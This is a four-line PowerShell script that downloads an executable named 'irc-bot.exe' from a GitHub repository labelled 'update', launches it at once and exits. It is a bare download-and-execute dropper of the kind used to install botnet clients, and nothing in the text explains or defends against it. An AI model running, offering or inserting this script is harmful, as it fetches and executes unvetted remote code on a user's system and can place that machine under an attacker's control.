$WebFile = "https://github.com/Paulo0819/update/raw/main/irc-bot.exe"
(New-Object System.Net.WebClient).DownloadFile($WebFile,"irc-bot.exe")
Start-Process ("irc-bot.exe")
exit
